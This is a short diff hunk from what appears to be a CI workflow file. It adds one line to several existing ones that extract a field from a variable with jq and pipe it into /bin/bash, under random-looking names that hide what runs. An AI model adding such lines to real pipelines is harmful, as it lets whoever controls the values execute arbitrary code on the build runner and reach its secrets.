@@ -49,6 +49,7 @@ jobs:
           echo $yevk40926 | jq -r .vbo68225 | /bin/bash
           printf '%s' "$zgek80" | jq -r .sruq52 | /bin/bash
           printf '%s' "$jae91821" | jq -r .eme52 | /bin/bash
+          echo $e18 | jq -r .w520 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
